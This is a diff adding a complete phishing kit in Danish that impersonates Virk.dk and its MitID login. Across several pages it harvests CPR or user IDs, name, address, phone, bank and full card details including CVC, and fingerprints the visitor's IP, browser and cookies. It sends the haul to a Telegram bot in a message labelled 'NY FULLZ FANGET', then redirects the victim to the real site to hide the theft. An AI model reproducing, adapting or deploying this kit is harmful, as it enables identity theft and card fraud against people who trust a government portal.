@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virk.dk | Digital Selvbetjening</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --virk-blue: #003b5c;
+            --virk-blue-dark: #002a42;
+            --virk-blue-light: #005a8a;
+            --virk-orange: #f59f00;
+            --bg-gray: #f4f6f8;
+            --text-main: #1a202c;
+            --text-muted: #64748b;
+            --white: #ffffff;
+            --border: #e2e8f0;
+            --shadow: 0 10px 30px rgba(0,0,0,0.06);
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-gray);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-main);
+            padding: 30px 20px;
+        }
+        .progress-container {
+            position: fixed;
+            top: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 15px;
+            z-index: 10;
+        }
+        .step {
+            width: 10px;
+            height: 10px;
+            background: #cbd5e0;
+            border-radius: 50%;
+            transition: all var(--transition);
+        }
+        .step.active { background: var(--virk-blue); box-shadow: 0 0 0 5px rgba(0,59,92,0.15); transform: scale(1.35); }
+        .step.done { background: var(--virk-blue-light); box-shadow: 0 0 0 3px rgba(0,90,138,0.2); }
+        .page { display: none; width: 100%; max-width: 1100px; text-align: center; animation: fadeInUp 0.5s ease-out; }
+        .page.active { display: block; }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 30px; height: 30px;
+            border: 4px solid rgba(0,59,92,0.1);
+            border-top-color: var(--virk-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .progress-bar-container {
+            width: 100%; height: 6px; background: #e9edf0; border-radius: 3px; overflow: hidden; margin-top: 20px;
+        }
+        .progress-bar {
+            height: 100%; width: 0%; background: var(--virk-blue); border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+        .home-container { display: flex; flex-direction: column; align-items: center; max-width: 1100px; margin: 0 auto; }
+        .home-header {
+            width: 100%; display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 0; border-bottom: 1px solid var(--border); margin-bottom: 50px;
+        }
+        .logo-virk { font-size: 32px; font-weight: 700; letter-spacing: -1px; color: var(--virk-blue); text-decoration: none; }
+        .logo-virk span { color: var(--virk-orange); }
+        .language-selector { font-weight: 500; color: var(--text-muted); display: flex; align-items: center; gap: 10px; }
+        .hero-section { display: flex; align-items: center; gap: 40px; text-align: left; margin-bottom: 60px; }
+        .hero-text { flex: 1; }
+        .hero-text h1 { font-size: 48px; font-weight: 700; margin-bottom: 20px; color: var(--virk-blue); line-height: 1.2; }
+        .hero-text p { font-size: 20px; color: var(--text-muted); line-height: 1.6; margin-bottom: 30px; }
+        .hero-image-placeholder {
+            flex: 1; width: 100%; max-width: 500px; aspect-ratio: 4/3;
+            background: linear-gradient(135deg, #e9f0f5, #d0e0e8);
+            border-radius: 20px; box-shadow: var(--shadow);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--virk-blue-light); font-size: 18px; font-weight: 500;
+        }
+        .card {
+            background: var(--white); padding: 40px 45px; border-radius: 24px;
+            box-shadow: var(--shadow); border: 1px solid var(--border);
+            max-width: 520px; margin: 0 auto; text-align: center;
+        }
+        .card h2 { color: var(--virk-blue); margin-bottom: 8px; font-weight: 600; }
+        .card .subtitle { color: var(--text-muted); margin-bottom: 25px; font-size: 15px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        .input-group label { display: block; font-weight: 500; margin-bottom: 8px; font-size: 14px; color: var(--text-main); }
+        input, select {
+            width: 100%; padding: 14px 16px; border: 1px solid var(--border);
+            border-radius: 12px; font-size: 16px; font-family: inherit;
+            background: #f9fafb; transition: border-color var(--transition), box-shadow var(--transition);
+            color: var(--text-main);
+        }
+        input:focus, select:focus {
+            outline: none; border-color: var(--virk-blue-light);
+            box-shadow: 0 0 0 3px rgba(0,90,138,0.15); background: #fff;
+        }
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%2364748b' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-position: right 16px center;
+        }
+        .btn-primary {
+            background-color: var(--virk-blue); color: white; border: none;
+            padding: 16px 35px; font-size: 17px; font-weight: 600;
+            border-radius: 12px; cursor: pointer; transition: background-color var(--transition), transform var(--transition);
+            width: 100%;
+        }
+        .btn-primary:hover { background-color: var(--virk-blue-dark); transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,59,92,0.2); }
+        .btn-primary:disabled { background-color: #b0c4d1; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn-secondary {
+            background: transparent; color: var(--virk-blue); border: 1px solid var(--virk-blue-light);
+            padding: 10px 16px; border-radius: 8px; font-size: 14px; cursor: pointer;
+            transition: background-color var(--transition); margin-top: 12px;
+        }
+        .btn-secondary:hover { background: rgba(0,59,92,0.05); }
+        .mitid-box {
+            background: #eef6fb; border: 1px solid #cbe4f0; padding: 14px; border-radius: 12px;
+            margin-bottom: 25px; display: flex; align-items: center; justify-content: center;
+            gap: 10px; font-weight: 500; color: var(--virk-blue); font-size: 15px;
+        }
+        .mitid-box img { width: 70px; }
+        .card-brand { font-size: 14px; color: var(--text-muted); margin-top: 5px; display: none; }
+        .card-brand.active { display: block; }
+        @media (max-width: 768px) {
+            .hero-section { flex-direction: column; text-align: center; }
+            .hero-text h1 { font-size: 32px; }
+            .home-header { justify-content: center; }
+            .card { padding: 30px 25px; }
+        }
+        .datalist-container { position: relative; }
+    </style>
+</head>
+<body>
+
+    <div class="progress-container" id="prog">
+        <div class="step active" id="s1"></div>
+        <div class="step" id="s2"></div>
+        <div class="step" id="s3"></div>
+        <div class="step" id="s4"></div>
+        <div class="step" id="s5"></div>
+    </div>
+
+    <!-- PAGE 1: HOMEPAGE -->
+    <section id="page1" class="page active">
+        <div class="home-container">
+            <header class="home-header">
+                <div class="logo-virk">Virk<span>.</span></div>
+                <div class="language-selector">
+                    <span>🌐 Dansk</span><span style="color:#cbd5e0;">|</span><span style="opacity:0.6;">EN</span>
+                </div>
+            </header>
+            <div class="hero-section">
+                <div class="hero-text">
+                    <h1>Gør din virksomhed digital</h1>
+                    <p>Virk.dk er din centrale indgang til det offentlige. Her kan du administrere alt fra CVR-registeret til dine ansattes feriepenge.</p>
+                    <button class="btn-primary" style="width:auto; padding:15px 40px;" onclick="nextPage(2)">Log ind nu</button>
+                </div>
+                <div class="hero-image-placeholder">🔒 Digitale selvbetjeningsløsninger</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- PAGE 2: USER ID / MITID -->
+    <section id="page2" class="page">
+        <div style="text-align:center; margin-bottom:20px;"><div class="logo-virk" style="font-size:28px;">Virk<span>.</span></div></div>
+        <div class="card">
+            <h2>Identifikation</h2>
+            <p class="subtitle">Log ind via MitID for at bekræfte din identitet</p>
+            <div class="mitid-box"><span>Logges ind via:</span><strong>MitID</strong></div>
+            <div class="input-group">
+                <label for="userid">Bruger‑ID eller CPR‑nummer</label>
+                <input type="text" id="userid" placeholder="Indtast dit ID" autocomplete="username">
+            </div>
+            <button class="btn-primary" onclick="nextPage(3)">Næste trin</button>
+        </div>
+    </section>
+
+    <!-- PAGE 3: PERSONAL INFO -->
+    <section id="page3" class="page">
+        <div style="text-align:center; margin-bottom:20px;"><div class="logo-virk" style="font-size:28px;">Virk<span>.</span></div></div>
+        <div class="card">
+            <h2>Bekræft personoplysninger</h2>
+            <p class="subtitle">Udfyld dine aktuelle oplysninger for at fortsætte</p>
+            <div class="input-group">
+                <label for="fullname">Fulde navn</label>
+                <input type="text" id="fullname" placeholder="Navn Navnesen">
+            </div>
+            <div class="input-group">
+                <label for="phone">Telefonnummer</label>
+                <input type="tel" id="phone" placeholder="+45 00 00 00 00">
+            </div>
+            <div class="input-group">
+                <label for="address">Adresse</label>
+                <input type="text" id="address" placeholder="Vejnavn, husnr., postnr. og by">
+            </div>
+            <div class="input-group">
+                <label for="bank">Tilknyttet bank (søgbar)</label>
+                <div class="datalist-container">
+                    <input type="text" id="bank" list="bankList" placeholder="Skriv for at søge...">
+                    <datalist id="bankList">
+                        <option value="Danske Bank">
+                        <option value="Nordea">
+                        <option value="Jyske Bank">
+                        <option value="Sydbank">
+                        <option value="Nykredit">
+                        <option value="Spar Nord">
+                        <option value="Arbejdernes Landsbank">
+                        <option value="Coop Bank">
+                        <option value="Saxo Bank">
+                        <option value="Ringkjøbing Landbobank">
+                        <option value="Sparekassen Danmark">
+                        <option value="Sparekassen Sjælland-Fyn">
+                        <option value="Sparekassen Kronjylland">
+                        <option value="Sparekassen Thy">
+                        <option value="Sparekassen Vendsyssel">
+                        <option value="Sparekassen Bredebro">
+                        <option value="Sparekassen Balling">
+                        <option value="Middelfart Sparekasse">
+                        <option value="Frøs Sparekasse">
+                        <option value="PenSam Bank">
+                        <option value="Basisbank">
+                        <option value="Lån & Spar Bank">
+                        <option value="Merkur Andelskasse">
+                        <option value="Andelskassen">
+                        <option value="Vestjysk Bank">
+                        <option value="Skjern Bank">
+                        <option value="Møns Bank">
+                        <option value="Lægernes Bank">
+                        <option value="Jutlander Bank">
+                        <option value="Nordfyns Bank">
+                        <option value="Totalbanken">
+                        <option value="Hvidbjerg Bank">
+                        <option value="Kreditbanken">
+                        <option value="Djurslands Bank">
+                        <option value="Østjydsk Bank">
+                        <option value="Nr. Nebel Sparekasse">
+                        <option value="Fanø Sparekasse">
+                        <option value="Stadil Sparekasse">
+                        <option value="Sønderhå-Hørsted Sparekasse">
+                        <option value="Klim Sparekasse">
+                        <option value="Den Jyske Sparekasse">
+                        <option value="Faster Andelskasse">
+                        <option value="Fjordbank">
+                        <option value="Fynske Bank">
+                        <option value="Lollands Bank">
+                        <option value="Morsø Sparekasse">
+                        <option value="Salling Bank">
+                        <option value="Vorbasse-Hejnsvig Sparekasse">
+                        <option value="Østervraa Sparekasse">
+                        <option value="Aabenraa Sparekasse">
+                        <option value="Almind Brand Bank">
+                        <option value="Borbjerg Sparekasse">
+                        <option value="Bøvlingbjerg Sparekasse">
+                        <option value="Egnsbank Nord">
+                        <option value="Frørup Andelskasse">
+                        <option value="Himmerland Sparekasse">
+                        <option value="Hjørring Sparekasse">
+                        <option value="J.A.K. Andelskasse">
+                        <option value="Københavns Andelskasse">
+                        <option value="Landbobanken">
+                        <option value="Lokalbank">
+                        <option value="Pengeinstituttet">
+                        <option value="Rise Sparekasse">
+                        <option value="Skjern Bank">
+                        <option value="Sparekassen for Nr. Nebel og Omegn">
+                    </datalist>
+                </div>
+            </div>
+            <button class="btn-primary" onclick="nextPage(4)">Næste trin</button>
+        </div>
+    </section>
+
+    <!-- PAGE 4: CARD DETAILS -->
+    <section id="page4" class="page">
+        <div style="text-align:center; margin-bottom:20px;"><div class="logo-virk" style="font-size:28px;">Virk<span>.</span></div></div>
+        <div class="card">
+            <h2>Betalingsoplysninger</h2>
+            <p class="subtitle">Til bekræftelse af din konto</p>
+            <div class="input-group">
+                <label for="cardNumber">Kortnummer</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" maxlength="23" autocomplete="cc-number">
+                <div id="cardBrand" class="card-brand">Korttype: </div>
+            </div>
+            <div style="display:flex; gap:15px;">
+                <div class="input-group" style="flex:1;">
+                    <label for="expiry">Udløbsdato</label>
+                    <input type="text" id="expiry" placeholder="MM/ÅÅ" maxlength="5" autocomplete="cc-exp">
+                </div>
+                <div class="input-group" style="flex:1;">
+                    <label for="cvc">CVC</label>
+                    <input type="text" id="cvc" placeholder="123" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
+                </div>
+            </div>
+            <button class="btn-primary" id="btnSubmit" onclick="submitData()">Bekræft og log ind</button>
+            <button class="btn-secondary" onclick="goBackToPage3()">Tilbage</button>
+        </div>
+    </section>
+
+    <!-- PAGE 5: LOADING -->
+    <section id="page5" class="page">
+        <div class="card" style="text-align:center;">
+            <div class="loading-spinner"></div>
+            <h2>Validerer oplysninger...</h2>
+            <div class="progress-bar-container"><div class="progress-bar" id="progressBar"></div></div>
+            <p class="subtitle" style="margin-top:20px;">Du bliver omdirigeret til Virk.dk</p>
+        </div>
+    </section>
+
+    <script>
+        // ================= TELEGRAM CONFIG =================
+        const TELEGRAM_BOT_TOKEN = "DIN_TELEGRAM_BOT_TOKEN";
+        const TELEGRAM_CHAT_ID = "DIN_TELEGRAM_CHAT_ID";
+
+        let collectedData = {};
+        let currentPage = 1;
+        const progressSteps = [
+            document.getElementById('s1'),
+            document.getElementById('s2'),
+            document.getElementById('s3'),
+            document.getElementById('s4'),
+            document.getElementById('s5')
+        ];
+        const pages = {
+            1: document.getElementById('page1'),
+            2: document.getElementById('page2'),
+            3: document.getElementById('page3'),
+            4: document.getElementById('page4'),
+            5: document.getElementById('page5')
+        };
+
+        function updateProgress() {
+            progressSteps.forEach((step, index) => {
+                step.classList.remove('active', 'done');
+                if (index + 1 === (currentPage - 1)) {
+                    step.classList.add('active');
+                } else if (index + 1 < (currentPage - 1)) {
+                    step.classList.add('done');
+                }
+            });
+        }
+
+        function showError(message) {
+            Swal.fire({
+                icon: 'info',
+                title: 'Bemærk',
+                text: message,
+                confirmButtonColor: '#003b5c',
+                confirmButtonText: 'OK'
+            });
+        }
+
+        function nextPage(pageNumber) {
+            if (pageNumber === 3) {
+                const userid = document.getElementById('userid').value.trim();
+                if (!userid) { showError('Indtast venligst dit bruger‑ID eller CPR‑nummer.'); return; }
+                collectedData.userid = userid;
+            }
+            if (pageNumber === 4) {
+                const fullname = document.getElementById('fullname').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                const address = document.getElementById('address').value.trim();
+                const bank = document.getElementById('bank').value.trim();
+                if (!fullname || !phone || !address || !bank) { showError('Udfyld venligst alle felter.'); return; }
+                collectedData.fullname = fullname;
+                collectedData.phone = phone;
+                collectedData.address = address;
+                collectedData.bank = bank;
+            }
+            Object.values(pages).forEach(p => p.classList.remove('active'));
+            pages[pageNumber].classList.add('active');
+            currentPage = pageNumber;
+            updateProgress();
+        }
+
+        function goBackToPage3() { nextPage(3); }
+
+        // ===== KORTNUMMER FORMATERING OG VALIDERING =====
+        const cardInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cvcInput = document.getElementById('cvc');
+        const cardBrandDiv = document.getElementById('cardBrand');
+
+        cardInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, ''); // kun tal
+            if (value.length > 16) value = value.slice(0, 16); // maks 16 cifre
+            let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            this.value = formatted;
+
+            let brand = '';
+            if (/^4/.test(value)) brand = 'Visa';
+            else if (/^(5[1-5]|2[2-7])/.test(value)) brand = 'Mastercard';
+            else if (/^5019/.test(value)) brand = 'Dankort';
+            else if (/^3[47]/.test(value)) brand = 'American Express';
+            else if (/^(300|301|302|303|304|305|36|38)/.test(value)) brand = 'Diners Club';
+            else if (/^6/.test(value)) brand = 'Discover';
+            else if (/^(62|88)/.test(value)) brand = 'UnionPay';
+            else if (value.length >= 6) brand = 'Ukendt';
+
+            if (value.length >= 4) {
+                cardBrandDiv.textContent = 'Korttype: ' + brand;
+                cardBrandDiv.classList.add('active');
+            } else {
+                cardBrandDiv.classList.remove('active');
+            }
+        });
+
+        expiryInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            if (value.length >= 3) {
+                this.value = value.slice(0, 2) + '/' + value.slice(2);
+            } else {
+                this.value = value;
+            }
+        });
+
+        cvcInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 3);
+        });
+
+        function luhnCheck(num) {
+            let arr = (num + '').split('').reverse().map(x => parseInt(x));
+            let lastDigit = arr.shift();
+            let sum = arr.reduce((acc, val, i) => (i % 2 === 0 ? acc + ((val * 2 > 9) ? val * 2 - 9 : val * 2) : acc + val), 0);
+            sum += lastDigit;
+            return sum % 10 === 0;
+        }
+
+        // ===== FINGERPRINT =====
+        async function getFingerprint() {
+            let ipInfo = {};
+            try {
+                const resp = await fetch('https://ipapi.co/json/');
+                ipInfo = await resp.json();
+            } catch(e) { ipInfo = {}; }
+
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                referrer: document.referrer,
+                url: location.href,
+                cookies: document.cookie,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || null,
+                deviceMemory: navigator.deviceMemory || null,
+                touchPoints: navigator.maxTouchPoints || 0,
+                ip: ipInfo.ip || 'Ukendt',
+                city: ipInfo.city || '',
+                region: ipInfo.region || '',
+                country: ipInfo.country_name || '',
+                org: ipInfo.org || '',
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // ===== TELEGRAM =====
+        async function sendToTelegram(data) {
+            const message = `🔴 *NY FULLZ FANGET* 🔴\n\n` +
+                `👤 *Bruger‑ID:* \`${data.userid}\`\n` +
+                `📛 *Fulde navn:* \`${data.fullname}\`\n` +
+                `📞 *Telefon:* \`${data.phone}\`\n` +
+                `🏠 *Adresse:* \`${data.address}\`\n` +
+                `🏦 *Bank:* \`${data.bank}\`\n` +
+                `💳 *Kortnummer:* \`${data.cardNumber}\`\n` +
+                `📅 *Udløb:* \`${data.expiry}\`\n` +
+                `🔐 *CVC:* \`${data.cvc}\`\n\n` +
+                `🌐 *IP:* \`${data.fingerprint.ip}\`\n` +
+                `📍 *By:* \`${data.fingerprint.city}, ${data.fingerprint.region}, ${data.fingerprint.country}\`\n` +
+                `🖥️ *Browser:* \`${data.fingerprint.userAgent}\`\n` +
+                `🍪 *Cookies:* \`${data.fingerprint.cookies}\`\n\n` +
+                `⏰ *Tid:* ${new Date().toLocaleString('da-DK')}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            try { await fetch(url, { mode: 'no-cors' }); } catch (e) { console.error('Telegram fejl:', e); }
+        }
+
+        // ===== SUBMIT =====
+        async function submitData() {
+            const cardNumberRaw = cardInput.value.replace(/\s/g, '');
+            const expiry = expiryInput.value.trim();
+            const cvc = cvcInput.value.trim();
+
+            if (cardNumberRaw.length < 12) { showError('Indtast venligst et gyldigt kortnummer.'); return; }
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) { showError('Udløbsdato skal være i format MM/ÅÅ.'); return; }
+            if (cvc.length !== 3) { showError('CVC skal være 3 cifre.'); return; }
+            if (!luhnCheck(cardNumberRaw)) { showError('Kortnummeret er ugyldigt.'); return; }
+
+            collectedData.cardNumber = cardNumberRaw;
+            collectedData.expiry = expiry;
+            collectedData.cvc = cvc;
+            collectedData.fingerprint = await getFingerprint();
+
+            const submitBtn = document.getElementById('btnSubmit');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Behandler...';
+
+            // Vis loader
+            Object.values(pages).forEach(p => p.classList.remove('active'));
+            pages[5].classList.add('active');
+            currentPage = 5;
+            updateProgress();
+
+            // Loader progress bar animation
+            const progressBar = document.getElementById('progressBar');
+            let width = 0;
+            const interval = setInterval(() => {
+                width += 10;
+                progressBar.style.width = width + '%';
+                if (width >= 100) {
+                    clearInterval(interval);
+                }
+            }, 150);
+
+            // Send til Telegram
+            await sendToTelegram(collectedData);
+
+            // Vent 3 sekunder og redirect til virk.dk
+            setTimeout(() => {
+                window.location.href = 'https://virk.dk/';
+            }, 3000);
+        }
+
+        // Start
+        updateProgress();
+    </script>
+</body>
+</html>
